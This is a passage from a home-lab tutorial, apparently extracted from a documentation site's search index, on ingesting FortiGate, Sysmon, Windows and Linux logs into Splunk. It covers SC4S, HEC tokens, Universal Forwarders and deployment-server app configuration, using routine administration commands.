the<code>/opt/splunk/bin</code> directory, restart Splunk Enterprise as the <code>splunk</code> user.</p> <pre><code>./splunk restart\n</code></pre> <p>On the Splunk web interface, navigate to Settings, then Indexes. Verify that the SC4S default indexes have been created. Use the filter search bar to find indexes if needed.</p> <p></p>"},{"location":"splunk/splunk.html#creating-a-hec-token","title":"Creating a HEC Token","text":"<p>On the Splunk Web UI, navigate to Settings &gt; Data Inputs &gt; HTTP Event Collector &gt; Global Settings. Select Enabled for All Tokens. Set main as the Default Index. Uncheck Enable SSL. Leave the HTTP Port Number as 8088. Click Save.</p> <p></p> <p>Click New Token, name it 'sc4s_token', and click Next.</p> <p></p> <p>Leave Source Type as Automatic. Leave Selected Allowed Indexes blank. Select main as the Default Index. Click Review, then Submit.</p> <p></p> <p>Copy your Token Value and save it in a notepad (you will need this later). You can also find your token value under Settings &gt; Data Inputs &gt; HTTP Event Collector.</p> <p></p> <p></p>"},{"location":"splunk/splunk.html#loading-sc4s-container-image","title":"Loading SC4S Container Image","text":"<p>In a tab, as a standard user, use Docker to load the SC4S container image. Make a note of the container ID and image name. If you are using CentOS, replace <code>docker</code> with <code>podman</code></p> <pre><code>cd ~/splunk-offline/sc4s\nsudo docker load &lt; oci_container.tar.gz\n</code></pre> <pre><code>#Example output\nLoaded image: ghcr.io/splunk/splunk-connect-for-syslog/container3:3.34.3\n</code></pre> <p>Use the container ID to create a local label using docker. </p> <pre><code>sudo docker tag ghcr.io/splunk/splunk-connect-for-syslog/container3:3.34.3 sc4slocal:latest\n</code></pre> <p>Create the systemd unit file\u00a0<code>/lib/systemd/system/sc4s.service</code> and copy and paste the following content:</p> <pre><code>sudo nano /lib/systemd/system/sc4s.service\n</code></pre> <pre><code>[Unit]\nDescription=SC4S Container\nWants=NetworkManager.service network-online.target docker.service\nAfter=NetworkManager.service network-online.target docker.service\nRequires=docker.service\n\n[Install]\nWantedBy=multi-user.target\n\n[Service]\nEnvironment=\"SC4S_IMAGE=sc4slocal:latest\"\n\n# Required mount point for syslog-ng persist data (including disk buffer)\nEnvironment=\"SC4S_PERSIST_MOUNT=splunk-sc4s-var:/var/lib/syslog-ng\"\n\n# Optional mount point for local overrides and configurations; see notes in docs\nEnvironment=\"SC4S_LOCAL_MOUNT=/opt/sc4s/local:/etc/syslog-ng/conf.d/local:z\"\n\n# Optional mount point for local disk archive (EWMM output) files\nEnvironment=\"SC4S_ARCHIVE_MOUNT=/opt/sc4s/archive:/var/lib/syslog-ng/archive:z\"\n\n# Map location of TLS custom TLS\nEnvironment=\"SC4S_TLS_MOUNT=/opt/sc4s/tls:/etc/syslog-ng/tls:z\"\n\nTimeoutStartSec=0\n\n#ExecStartPre=/usr/bin/docker pull $SC4S_IMAGE\n\n# Note: /usr/bin/bash will not be valid path for all OS\n# when startup fails on running bash check if the path is correct\nExecStartPre=/usr/bin/bash -c \"/usr/bin/systemctl set-environment SC4SHOST=$(hostname -s)\"\n\n# Note: Prevent the error 'The container name \"/SC4S\" is already in use by container &lt;container_id&gt;. You have to remove (or rename) that container to be able to reuse that name.'\nExecStartPre=/usr/bin/bash -c \"/usr/bin/docker rm SC4S &gt; /dev/null 2&gt;&amp;1 || true\"\nExecStart=/usr/bin/docker run \\\n        -e \"SC4S_CONTAINER_HOST=${SC4SHOST}\" \\\n        -v \"$SC4S_PERSIST_MOUNT\" \\\n        -v \"$SC4S_LOCAL_MOUNT\" \\\n        -v \"$SC4S_ARCHIVE_MOUNT\" \\\n        -v \"$SC4S_TLS_MOUNT\" \\\n        --env-file=/opt/sc4s/env_file \\\n        --network host \\\n        --name SC4S \\\n        --rm $SC4S_IMAGE\n\nRestart=on-failure\n</code></pre>"},{"location":"splunk/splunk.html#configuring-ipv4-forwarding","title":"Configuring IPv4 forwarding","text":"<p>IPv4 forwarding is not enabled by default. IPv4 forwarding must be enabled for container networking.</p> <p>To check that IPv4 forwarding is enabled:\u00a0</p> <pre><code>sudo sysctl net.ipv4.ip_forward\n</code></pre> <p>To enable IPv4 forwarding:\u00a0</p> <pre><code>sudo sysctl net.ipv4.ip_forward=1\n</code></pre> <p>To ensure your changes persist upon reboot, define sysctl settings through files in\u00a0<code>/usr/lib/sysctl.d/</code> and\u00a0<code>/etc/sysctl.d/</code>. To override only specific settings, either add a file with a lexically later name in\u00a0<code>/etc/sysctl.d/</code>\u00a0and put following setting there or find this specific setting in one of the existing configuration files and set the value to\u00a0<code>1</code>. </p> <pre><code>cd /usr/lib/sysctl.d/\nsudo nano 100-custom.conf\n</code></pre> <pre><code>net.ipv4.ip_forward=1\n</code></pre> <pre><code>cyber@Splunk:/usr/lib/sysctl.d$ ls\n100-custom.conf  10-apparmor.conf  30-tracker.conf  50-bubblewrap.conf  50-pid-max.conf  99-protect-links.conf\n</code></pre> <p>Repeat the same steps for <code>/etc/sysctl.d/</code>.</p> <pre><code>cd /etc/sysctl.d/\nsudo nano 100-custom.conf\n</code></pre> <pre><code>net.ipv4.ip_forward=1\n</code></pre> <pre><code>cyber@Splunk:/etc/sysctl.d$ ls\n100-custom.conf           10-ipv6-privacy.conf      10-magic-sysrq.conf  10-network-security.conf  10-zeropage.conf  README.sysctl\n10-console-messages.conf  10-kernel-hardening.conf  10-map-count.conf    10-ptrace.conf            99-sysctl.conf\n</code></pre> <p>Create a Docker volume for SC4S disk buffer and state files.</p> <pre><code>sudo docker volume create splunk-sc4s-var\n</code></pre> <p>Create directories to be used as a mount point for local overrides and configurations:</p> <pre><code>sudo mkdir -p /opt/sc4s/local\nsudo mkdir -p /opt/sc4s/archive\nsudo mkdir -p /opt/sc4s/tls\n</code></pre> <p>Create the environment file\u00a0<code>/opt/sc4s/env_file</code>\u00a0and replace the HEC_URL and HEC_TOKEN as necessary:</p> <pre><code>sudo nano /opt/sc4s/env_file\n</code></pre> <pre><code>SC4S_DEST_SPLUNK_HEC_DEFAULT_URL=http://10.0.0.100:8088\nSC4S_DEST_SPLUNK_HEC_DEFAULT_TOKEN=(HEC_Token_value)\n#Uncomment the following line if using untrusted SSL certificates\nSC4S_DEST_SPLUNK_HEC_DEFAULT_TLS_VERIFY=no\n</code></pre>"},{"location":"splunk/splunk.html#testing-sc4s","title":"Testing SC4S","text":"<p>Enable and start SC4S. Verify SC4S is active and running (exit with <code>q</code>).</p> <pre><code>sudo systemctl daemon-reload\nsudo systemctl enable sc4s\nsudo systemctl start sc4s\nsudo systemctl status sc4s\n</code></pre> <p>Check Docker logs for errors:</p> <pre><code>sudo docker logs SC4S\n</code></pre> <pre><code>#Example Output\nSC4S_ENV_CHECK_HEC: Splunk HEC connection test successful to index=main for sourcetype=sc4s:fallback...\nSC4S_ENV_CHECK_HEC: Splunk HEC connection test successful to index=main for sourcetype=sc4s:events...\nsyslog-ng checking config\nsc4s version=3.30.0\nstarting goss\nstarting syslog-ng\n</code></pre> <p>Search on Splunk for successful installation of SC4S. Make sure to select \u201cAll time.\u201d</p> <pre><code>index=* sourcetype=sc4s:events \"starting up\"\n</code></pre> <p></p> <p>Send sample data to UDP port 514: </p> <pre><code>echo \"Hello SC4S\" &gt; /dev/udp/10.0.0.100/514\n</code></pre> <p>Search in Splunk to verify successful receipt of sample data on UDP port 514:</p> <pre><code>index=* \"Hello SC4S\"\n</code></pre> <p></p> <p>Earlier, we configured FortiGate to send logs on UDP port 514. Since SC4S is configured to receive logs on UDP port 514, we should now see FortiGate logs. Verify that SC4S is receiving FortiGate event and traffic logs with source <code>sc4s</code>. It may take some time for the logs to appear.</p> <pre><code>index=* sourcetype=fgt_event\n</code></pre> <p></p> <pre><code>index=* sourcetype=fgt_traffic\n</code></pre> <p></p>"},{"location":"splunk/splunk.html#ingesting-fortigate-logs-through-fortigate-app-option-2","title":"Ingesting FortiGate Logs through FortiGate App (Option 2)","text":"<p>If SC4S does not work for your environment, another option to ingest FortiGate logs on Splunk is through FortiGate App. On Splunk web UI, navigate to Manage Apps, then Install from file. Upload the FortiGate App (tar archive) from <code>~/splunk-offline/apps</code> directory. Check the upgrade box. </p> <p></p>"},{"location":"splunk/splunk.html#adding-udp-data-input","title":"Adding UDP Data Input","text":"<p>Navigate to Settings, Data Inputs, then UDP on Splunk Web UI. Click New Local UDP. For Port, enter <code>5514</code> and leave other parameters as is. We are using port 5514 for demonstration purposes as port 514 is being used by SC4S. If you are not using SC4S, you can put port 514 here.</p> <p></p> <p>For Source type, search and select <code>fortigate_log</code> .</p> <p></p> <p>Click Review and Submit. If you get the error <code>UDP 514 is not available</code> use other UDP port (e.g. <code>5514</code>). Restart Splunk Enterprise as the <code>splunk</code> user for the change to take effect.</p> <pre><code>cd /opt/splunk/bin\n./splunk restart\n</code></pre>"},{"location":"splunk/splunk.html#configuring-syslog-logging-on-fortigate-udp-5514","title":"Configuring Syslog Logging on FortiGate (UDP 5514)","text":"<p>Configure FortiGate to send syslog to port 5514 by running the following command. Ensure you enter the correct port number. When prompted, confirm the port number.</p> <pre><code>FGVMEVMBF57GNJF3 # config log syslogd setting\n\nFGVMEVMBF57GNJF3 (setting) # set port 5514\n\nFGVMEVMBF57GNJF3 (setting) # show\nconfig log syslogd setting\n    set status enable\n    set server \"10.0.0.100\"\n    set port 5514\n    set source-ip \"10.0.0.1\"\nend\n\nFGVMEVMBF57GNJF3 (setting) # end\nPort 5514 is different from default port 514.\nConfirm to use port 5514 instead?\nDo you want to continue? (y/n)y\n\nPort set to 5514\n\nFGVMEVMBF57GNJF3 # \n</code></pre>"},{"location":"splunk/splunk.html#testing-fortigate-app","title":"Testing FortiGate App","text":"<p>Navigate to Search &amp; Reporting on Splunk web UI. Search for <code>index=*</code> and verify that you can see <code>fortigate_traffic</code> and <code>fortigate_event</code> as source type. Verify that most recent log\u2019s source is <code>udp 5514</code>. If the source is still pointing to <code>sc4s</code>, restart the Splunk. </p> <p></p> <p>Search for <code>index=* sourcetype=fortigate_traffic</code> and <code>index=* sourcetype=fortigate_traffic</code>. Verify that most recent log\u2019s source is <code>udp 5514</code> .</p> <p></p> <p></p>"},{"location":"splunk/splunk.html#installing-sysmon-on-windows","title":"Installing Sysmon on Windows","text":"<p>Download Sysmon and sysmonconfig.xml. Extract Sysmon.zip and move sysmonconfig.xml into the Sysmon folder where Sysmon.exe is located. Run PowerShell as Administrator and change directory to path where extracted Sysmon is located. Install Symon by running the following command:</p> <pre><code>.\\Sysmon64.exe -accepteula -i sysmonconfig.xml\n</code></pre> <pre><code>#Example output\n\nPS C:\\Users\\Administrator\\Downloads\\Sysmon\\Sysmon&gt; ls\n\n    Directory: C:\\Users\\Administrator\\Downloads\\Sysmon\\Sysmon\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\n------        7/23/2024   2:08 PM           7490 Eula.txt\n------        7/23/2024   2:08 PM        8480560 Sysmon.exe\n------        7/23/2024   2:08 PM        4563248 Sysmon64.exe\n------        7/23/2024   2:08 PM        4993440 Sysmon64a.exe\n-a----        8/26/2024   7:31 PM         123257 sysmonconfig.xml\n\nPS C:\\Users\\Administrator\\Downloads\\Sysmon\\Sysmon&gt; .\\Sysmon64.exe -accepteula -i .\\sysmonconfig.xml\n\nSystem Monitor v15.15 - System activity monitor\nBy Mark Russinovich and Thomas Garnier\nCopyright (C) 2014-2024 Microsoft Corporation\nUsing libxml2. libxml2 is Copyright (C) 1998-2012 Daniel Veillard. All Rights Reserved.\nSysinternals - www.sysinternals.com\n\nLoading configuration file with schema version 4.50\nSysmon schema version: 4.90\nConfiguration file validated.\nSysmon64 installed.\nSysmonDrv installed.\nStarting SysmonDrv.\nSysmonDrv started.\nStarting Sysmon64..\nSysmon64 started.\n</code></pre> <p>Verify that Sysmon is installed by checking Services (Sysmon64) and Windows Event Viewer (Applications and Services Logs &gt; Microsoft &gt; Windows &gt; Sysmon). </p> <p></p> <p></p>"},{"location":"splunk/splunk.html#installing-splunk-uf-on-windows","title":"Installing Splunk UF on Windows","text":"<p>For installing the Splunk Universal Forwarder (UF) on Windows, there are three options:</p> <p>Option 1: Install with a Domain Account</p> <p>This option worked successfully in my lab without any issues; however, it requires additional configuration steps.</p> <p>Option 2: Install with a Virtual Account (Annex 1)</p> <p>This is Splunk\u2019s recommended approach, but I encountered issues despite troubleshooting the errors.</p> <p>Option 3: Install with the Local System Account</p> <p>While not a security best practice, this option works reliably without any issues.</p> <p>This documentation covers Options 1 and 2, as Option 3 follows a similar process. Please choose the option that works best for your requirements.</p> <p></p>"},{"location":"splunk/splunk.html#installing-splunk-uf-with-a-domain-account-option-1","title":"Installing Splunk UF with a Domain Account (Option 1)","text":""},{"location":"splunk/splunk.html#creating-a-domain-account","title":"Creating a Domain Account","text":"<p>In this lab, WS2019 host is joined to a domain called <code>cyber.local</code> and promoted as a domain controller. This step is applicable to a domain-joined environment. Create a domain user called <code>splunk</code> and assign it as a member of <code>Event Log Readers Group</code>. This account will be used to run Splunk Forwarder. </p> <ul> <li>Go to Active Directory Users and Computers &gt; domain &gt; Users</li> <li>Right-click Users &gt; New &gt; User</li> <li>First name: splunk</li> <li>Last name: (blank)</li> <li>Full name: splunk</li> <li>User logon name: splunk</li> <li>Right-click splunk user &gt; Properties &gt; Member of &gt; Add &gt; put <code>Event Log Readers</code> and click Check Names &gt; OK &gt; Apply and OK</li> </ul> <p></p>"},{"location":"splunk/splunk.html#configuring-rdp-optional","title":"Configuring RDP (Optional)","text":"<p>In this lab, RDP configuration was required for the <code>splunk</code> user to login to WS2019 host. This step is optional. Open Local Group Policy Editor by clicking Run &gt; type <code>gpedit.msc</code> . In the Local Group Policy Editor, navigate to Windows Settings &gt; Security Settings &gt; Local Policies &gt; User Rights Assignment &gt; Allow log on through Remote Desktop Services. Add user <code>splunk</code>.</p> <p></p> <p>In the Local Group Policy Editor, navigate to Computer configuration &gt; Administrative Templates &gt; Windows Components &gt; Remote Desktop Services &gt; Remote Desktop Session Host &gt; Connections &gt; Allow users to connect remotely by using Remote Desktop Services &gt;Enabled.</p> <p></p> <p>Navigate to Remote Desktop Session Host &gt; Security &gt; Require user authentication for remote connections by using Network Level Authentication &gt; Enabled.</p> <p></p> <p>In Server Manager, go to Local Server. Make sure Remote Desktop is Enabled. Click <code>Enabled</code> next to Remote Desktop.  Click Select Users. Add user <code>splunk</code>.</p> <p></p> <p>Enable inbound firewall rules related to Remote Desktop.</p> <p></p> <p>RDP into <code>WS2019</code> host as the <code>splunk</code> user from another internal host.</p>"},{"location":"splunk/splunk.html#configuring-splunk-uf-on-windows","title":"Configuring Splunk UF on Windows","text":"<p>Download and transfer the Splunk Universal Forwarder (UF) (msi) for Windows. Run Universal Forwarder (msi), accept license, select on-premise Splunk Enterprise instance, and click Customize Options.</p> <p></p> <p>Leave Path as default and click Next</p> <p></p> <p>Leave Certificate Password empty and click Next</p> <p></p> <p>Select Domain Account.  </p> <p></p> <p>Specify domain\\splunk and password for the account.</p> <p></p> <p>Leave permissions as default.</p> <p></p> <p>Leave everything unchecked and click Next.</p> <p></p> <p>Create credentials for the administrator account. </p> <p></p> <p>Enter IP address of Deployment Server (Splunk server) and port 8089. Note the IP address in the screenshot is different to the lab setup. </p> <p></p> <p>Enter IP address of Receiving Indexer (Splunk server) and port 9997.</p> <p></p> <p>Click Install. Click Finish after install is complete.</p> <p></p>"},{"location":"splunk/splunk.html#creating-a-new-outbound-firewall-rule","title":"Creating a New Outbound Firewall Rule","text":"<p>Navigate to Windows Defender Firewall with Advanced Security. Right-click on Outbound Rules and select New Rule. Select Program as Rule Type.</p> <p></p> <p>For program path, browse to C:\\Program Files\\SplunkUniversalForwarder\\bin\\splunkd.exe</p> <p></p> <p>Select Allow the Connection.</p> <p></p> <p>Check all boxes for Domain, Private and Public.</p> <p></p> <p>Name the rule as Splunk outbound</p> <p></p>"},{"location":"splunk/splunk.html#verifying-agent-connection-on-windows","title":"Verifying Agent Connection on Windows","text":"<p>Verify that yours Windows host is connected to the Deployment Server. On the Splunk Enterprise web UI, go to Settings &gt; Forwarder Management. You should be able to see your Windows client. </p> <p></p> <p></p>"},{"location":"splunk/splunk.html#installing-splunk-uf-on-linux","title":"Installing Splunk UF on Linux","text":"<p>Download and transfer Splunk UF (tar archive) for Linux. Unpack the tar archive to /opt directory as a standard user.</p> <pre><code>sudo tar xvzf splunkforwarder*.tgz -C /opt\n</code></pre> <p>Create a user called <code>splunk</code> and change the ownership of <code>/opt/splunkforwarder</code> to the <code>splunk</code> user.</p> <pre><code>sudo adduser splunk\n</code></pre> <pre><code>sudo chown -R splunk:splunk /opt/splunkforwarder/\ncd /opt\nls -la\n</code></pre> <pre><code>#Example output\ntotal 12\ndrwxr-xr-x  3 root   root   4096 Feb 27 11:00 .\ndrwxr-xr-x 23 root   root   4096 Feb  1 03:42 ..\ndrwxr-xr-x  9 splunk splunk 4096 Feb 21 07:30 splunkforwarder\n</code></pre>"},{"location":"splunk/splunk.html#configuring-splunk-uf-on-linux","title":"Configuring Splunk UF on Linux","text":"<p>Switch to <code>splunk</code> user and start Splunk UF. When prompted, create admin credentials.</p> <pre><code>su splunk\n</code></pre> <pre><code>cd /opt/splunkforwarder/bin\n./splunk start --accept-license\n</code></pre> <p>In the <code>/opt/splunkforwarder/bin</code> directory, as the <code>splunk</code> user, run the following command to connect to Linux client (UF) the deployment server (Splunk Enterprise). </p> <pre><code>./splunk set deploy-poll 10.0.0.100:8089\n</code></pre> <p>Verify that the deployment server's IP address in <code>deploymentclient.conf</code> (located in <code>/opt/splunkforwarder/etc/system/local/</code>) is correct.</p> <pre><code>cat /opt/splunkforwarder/etc/system/local/deploymentclient.conf\n</code></pre> <pre><code>#Example output\n[target-broker:deploymentServer]\ntargetUri = 10.0.0.100:8089\n</code></pre> <p>Run the following command to add the forward-server as the Splunk Enterprise. We are essentially configuring UF to send logs to the listening port of Splunk Enterprise.</p> <pre><code>./splunk add forward-server 10.0.0.100:9997\n</code></pre> <p>Verify that the tcpout server\u2019s IP address in <code>outputs.conf</code> (located in <code>/opt/splunkforwarder/etc/system/local</code>) is correct.</p> <pre><code>cat /opt/splunkforwarder/etc/system/local/outputs.conf\n</code></pre> <pre><code>#Example output\n[tcpout]\ndefaultGroup = default-autolb-group\n\n[tcpout:default-autolb-group]\nserver = 10.0.0.100:9997\n\n[tcpout-server://10.0.0.100:9997]\n</code></pre> <p>Restart Splunk Forwarder for changes to take effect.</p> <pre><code>./splunk restart\n</code></pre>"},{"location":"splunk/splunk.html#verifying-agent-connection-on-linux","title":"Verifying Agent Connection on Linux","text":"<p>On web UI of Splunk Enterprise, go to settings, forwarder management. We should be able to see our Linux client (UF). If Linux client doesn\u2019t appear, try refreshing the web browser or restart Splunk Enterprise.</p> <p></p> <p></p>"},{"location":"splunk/splunk.html#installing-splunk-apps","title":"Installing Splunk Apps","text":"<p>Earlier, we downloaded the following Splunk Apps (tar archive files)</p> <ul> <li>Splunk Add-on for MS Windows</li> <li>Splunk Add-on for Sysmon</li> <li>Fortinet FortiGate Add-on for Splunk (optional: required if ingesting FortiGate logs through this app)</li> <li>Splunk Add-on for Unix and Linux</li> </ul> <p></p> <p>Install the add-ons (apps) on Splunk Enterprise web UI. Go to Apps &gt; Manage Apps &gt; Install app from file &gt; Upload the tar archive files. Check Upgrade app. </p> <p></p> <p></p> <p></p> <p></p> <p>If prompted to set up the apps, click set up later.</p> <p></p> <p>On terminal of the Splunk VM where Splunk Enterprise is installed, verify that there are Windows, Sysmon, Linux and FortiGate Apps in the <code>/opt/splunk/etc/apps</code> directory. Copy the apps to <code>/opt/splunk/etc/deployment-apps</code> directory.</p> <pre><code>cd /opt/splunk/etc/apps\ncp -r Splunk_TA_* /opt/splunk/etc/deployment-apps/\n</code></pre> <p>Verify that the apps are shown in the Splunk Enterprise web UI. Go to Settings &gt; Forwarder Management &gt; Configurations.</p> <p></p>"},{"location":"splunk/splunk.html#creating-indexes-for-apps","title":"Creating Indexes for Apps","text":"<p>Create indexes on the web UI. Your index name must match with index name in <code>inputs.conf</code> in each app. Go to settings &gt; indexes &gt; New Index. </p> Index Name wineventlog sysmonlog unixlog (optional) Index Data Type Events Events Events Max Size of entire Index 1 GB (Default is 500 GB so adjust accordingly) 1 GB (Default is 500 GB so adjust accordingly) 1 GB (Default is 500 GB so adjust accordingly) Enable Reduction Enable (optional) Enable (optional) Enable (optional) Reduce tisdx files older than 90 days 90 days 90 days <p>Verify that indexes have been created and enabled.</p> <p></p> <p></p> <p></p>"},{"location":"splunk/splunk.html#configuring-linux-app","title":"Configuring Linux App","text":""},{"location":"splunk/splunk.html#for-splunk-uf-v940-and-above","title":"For Splunk UF v9.4.0 and above:","text":"<p>Navigate to Groups / Server Classes &gt; New server class. Add a new server class called nix and click Save.</p> <p></p> <p>Click the nix server class. Navigate to Agents &gt; Edit agent assignment.</p> <p></p> <p>Put * in Include, and filter by linux-x86_64. Click Preview and make sure you can see a tick next to the hostname of the client. Click Save.</p> <p></p> <p>Navigate to nix server class configurations &gt; Edit configurations.</p> <p></p> <p>Select Splunk_TA_nix, add to Assigned Applications, then click Save.</p> <p></p> <p>On the nix server class configurations page, click Splunk_TA_nix.</p> <p></p> <p>Click on the toggle switch for Restart Agent.</p> <p></p> <p>Navigate back to the nix server class configurations page. Verify that the Deployment Status for Linux app shows as successful. This process may take some time, so try refreshing the page periodically.</p> <p></p>"},{"location":"splunk/splunk.html#for-older-versions-of-splunk-uf","title":"For older versions of Splunk UF:","text":"<p>On the Forwarder Management page of the web UI, click Edit under Actions for Splunk_TA_nix. Select Restart Splunkd After Installation, create a New Server Class called nix, and click Save</p> <p></p> <p></p> <p>Click Add Apps and select Splunk_TA_nix. Click Save.</p> <p></p> <p>Click Add Clients. Put * in include, and filter by linux-x86_64. Click Preview and Save. </p> <p></p> <p>You should see Restart Splunkd in the After installation column. If only Enable App is shown, Edit each app and select Restart Splunkd. Verify the configuration in the Forwarder Management.</p> <p></p> <p>If the settings are not applied try reloading the deployment server.</p> <pre><code>./splunk reload deploy-server\n</code></pre>"},{"location":"splunk/splunk.html#editing-config-files-for-linux-app","title":"Editing Config Files for Linux App","text":"<p>On the Splunk VM where Splunk Enterprise is installed, change into <code>/opt/splunk/etc/deployment-apps/Splunk_TA_nix/local</code> *directory. Copy <code>app.conf</code>, <code>inputs.conf</code> and <code>props.conf</code> from <code>/opt/splunk/etc/deployment-apps/Splunk_TA_nix/default</code> *directory.</p> <pre><code>cd /opt/splunk/etc/deployment-apps/Splunk_TA_nix/local\ncp /opt/splunk/etc/deployment-apps/Splunk_TA_nix/default/app.conf .\ncp /opt/splunk/etc/deployment-apps/Splunk_TA_nix/default/inputs.conf .\ncp /opt/splunk/etc/deployment-apps/Splunk_TA_nix/default/props.conf .\n</code></pre> <p>Make the following changes to inputs.conf: </p> <pre><code>nano inputs.conf\n</code></pre> <pre><code>[default]\nindex = unixlog\n...\n[monitor:///var/log]\nwhitelist=(\\.log|log$|messages|secure|auth|mesg$|cron$|acpid$|\\.out)\nblacklist=(lastlog|anaconda\\.syslog)\ndisabled = 0\n...\n</code></pre> <p>On the Ubuntu VM where Splunk UF is installed, navigate to <code>/opt/splunkforwarder/etc/apps/Splunk_TA_nix/local</code> directory. Copy app.conf, inputs.conf and props.conf from <code>/opt/splunkforwarder/etc/apps/Splunk_TA_nix/default</code> directory.</p> <pre><code>cd /opt/splunkforwarder/etc/apps/Splunk_TA_nix/local\ncp /opt/splunkforwarder/etc/apps/Splunk_TA_nix/default/app.conf .\ncp /opt/splunkforwarder/etc/apps/Splunk_TA_nix/default/inputs.conf .\ncp /opt/splunkforwarder/etc/apps/Splunk_TA_nix/default/props.conf .\n</code></pre> <p>Edit inputs.conf (same as above). Make the following changes to inputs.conf: </p> <pre><code>nano inputs.conf\n</code></pre> <pre><code>[default]\nindex = unixlog\n...\n[monitor:///var/log]\nwhitelist=(\\.log|log$|messages|secure|auth|mesg$|cron$|acpid$|\\.out)\nblacklist=(lastlog|anaconda\\.syslog)\ndisabled = 0\n...\n</code></pre> <p>Restart Splunk Universal Forwarder.</p> <pre><code>cd /opt/splunkforwarder/bin\n./splunk restart\n</code></pre> <p>On the Ubuntu VM where Splunk UF is installed, recursively change the ownership of <code>/var/log</code> directory to <code>splunk:splunk</code> </p> <pre><code>sudo chown -R splunk:splunk /var/log\n</code></pre> <p>On the Splunk Enterprise web interface, verify that data is being indexed on unixlog.</p> <pre><code>index=\"unixlog\"\n</code></pre> <p></p> <p></p>"},{"location":"splunk/splunk.html#configuring-windows-and-sysmon-apps","title":"Configuring Windows and Sysmon Apps","text":""},{"location":"splunk/splunk.html#for-splunk-v-940-and-above","title":"For Splunk v 9.4.0 and above:","text":"<p>Navigate to Groups / Server Classes &gt; New server class. Add a new server class called win and click Save.</p> <p></p> <p>Click the win server class. Navigate to Agents &gt; Edit agent assignment.</p> <p></p> <p>Put * in Include, and filter by windows-x64. Click Preview and make sure you can see a tick next to the hostname of the client. Click Save.</p> <p></p> <p>Navigate to win server class configurations &gt; Edit configurations.</p> <p></p> <p>Add Apps and select Splunk_TA_windows and Splunk_TA_micorsoft_sysmon. Click Save.</p> <p></p> <p>On the win server class configurations page, click Splunk_TA_windows.</p> <p></p> <p>Click on the toggle switch for Restart Agent.</p> <p></p> <p>Navigate back to the win server class configurations page and repeat the same process for Splunk_TA_micorsoft_sysmon. </p> <p></p> <p>Navigate back to the win server class Configurations page. Verify that the Deployment Status for both the Windows and Sysmon apps shows as successful. This process may take some time, so try refreshing the page periodically.</p> <p></p>"},{"location":"splunk/splunk.html#for-older-versions-of-splunk","title":"For older versions of Splunk:","text":"<p>On the Forwarder Management page of the web UI, click Edit under Actions for Splunk_TA_windows. Select Restart Splunkd After Installation, add New Server Class called win, and click Save</p> <p></p> <p>Click Add Apps and select Splunk_TA_windows and Splunk_TA_micorsoft_sysmon. Click Save.</p> <p></p> <p>Click Add Clients. Put * in Include, and filter by windows-x64. Click Preview and Save.</p> <p></p> <p>You should see Restart Splunkd in the After installation column. If only Enable App is shown, Edit each app and select Restart Splunkd.</p> <p></p> <p></p> <p>Verify the configuration in the Forwarder Management.</p> <p></p> <p></p> <p>If the configuration is not applied, try reloading the deployment-server</p> <pre><code>./splunk reload deploy-server\n</code></pre> <p>Verify that <code>/opt/splunk/etc/system/local/serverclass.conf</code> aligns with our configuration so far</p> <pre><code>cat /opt/splunk/etc/system/local/serverclass.conf\n</code></pre> <pre><code>[serverClass:win:app:Splunk_TA_microsoft_sysmon]\nrestartSplunkWeb = 0\nrestartSplunkd = 1\nstateOnClient = enabled\n\n[serverClass:win:app:Splunk_TA_windows]\nrestartSplunkWeb = 0\nrestartSplunkd = 1\nstateOnClient = enabled\n\n[serverClass:win]\nmachineTypesFilter = windows-x64\nwhitelist.0 = *\n</code></pre>"},{"location":"splunk/splunk.html#editing-config-files-for-windows-app","title":"Editing Config Files for Windows App","text":"<p>On the Splunk VM where Splunk Enterprise is installed, change into <code>opt/splunk/etc/deployment-apps/Splunk_TA_windows/local</code> directory</p> <p>Copy <code>app.conf</code> *and <code>inputs.conf</code> from <code>/opt/splunk/etc/deployment-apps/Splunk_TA_windows/default</code> *directory</p> <pre><code>cd /opt/splunk/etc/deployment-apps/Splunk_TA_windows/local\ncp /opt/splunk/etc/deployment-apps/Splunk_TA_windows/default/app.conf .\ncp /opt/splunk/etc/deployment-apps/Splunk_TA_windows/default/inputs.conf .\n</code></pre> <p>Make the following changes to <code>inputs.conf</code></p> <pre><code>nano inputs.conf\n</code></pre> <pre><code>[default]\nindex = wineventlog\n\n###### OS Logs ######\n[WinEventLog://Application]\ndisabled = 0\nstart_from = oldest\ncurrent_only = 0\ncheckpointInterval = 5\nrenderXml=false \n\n[WinEventLog://Security]\ndisabled = 0\nstart_from = oldest\ncurrent_only = 0\nevt_resolve_ad_obj = 1\ncheckpointInterval = 5\nblacklist1 = EventCode=\"4662\" Message=\"Object Type:(?!\\s*groupPolicyContainer)\"\nblacklist2 = EventCode=\"566\" Message=\"Object Type:(?!\\s*groupPolicyContainer)\"\nrenderXml=false \n\n[WinEventLog://System]\ndisabled = 0\nstart_from = oldest\ncurrent_only = 0\ncheckpointInterval = 5\nrenderXml=false\n</code></pre> <p>On WS2019 host where Splunk Universal Forwarder is configured, navigate to <code>C:\\Program Files\\SplunkUniversalForwarder\\etc\\apps\\Splunk_TA_windows\\local</code> . Copy <code>app.conf</code> and <code>inputs.conf</code> from <code>C:\\Program Files\\SplunkUniversalForwarder\\etc\\apps\\Splunk_TA_windows\\default</code> . Edit <code>inputs.conf</code> (same as above). Open the Notepad or Wordpad as administrator and edit the inputs.conf file.</p> <p></p> <p>Restart Splunk Universal Forwarder. On PowerShell, change directory into <code>C:\\program files\\SplunkUniversalForwarder\\bin</code> . Run <code>./splunk restart</code></p> <pre><code>cd \"C:\\program files\\SplunkUniversalForwarder\\bin\"\n./splunk restart\n</code></pre> <pre><code>#Example output\nPS C:\\Users\\Administrator&gt; cd \"C:\\program files\\SplunkUniversalForwarder\\bin\"\nPS C:\\program files\\SplunkUniversalForwarder\\bin&gt; ./splunk restart\nSplunkForwarder: Stopped\n\nSplunk&gt; Another one.\n\nChecking prerequisites...\n        Checking mgmt port [8089]: open\n        Checking conf files for problems...\n        Done\n        Checking default conf files for edits...\n        Validating installed files against hashes from 'C:\\program files\\SplunkUniversalForwarder\\splunkforwarder-9.3.0-51ccf43db5bd-windows-64-manifest'\n        All installed files intact.\n        Done\nAll preliminary checks passed.\n\nStarting splunk server daemon (splunkd)...\n\nSplunkForwarder: Starting (pid 2328)\nDone\n</code></pre> <p>Verify that data is being forwarded on wineventlog index. On web UI, navigate to Settings &gt; Indexes and refresh the page. Go to Apps &gt; Search &amp; Reporting &gt; Search for <code>index=wineventlog</code> .</p> <pre><code>index=\"wineventlog\"\n</code></pre> <p></p> <p></p> <p>If the logs are not being indexed, try refreshing the web UI. 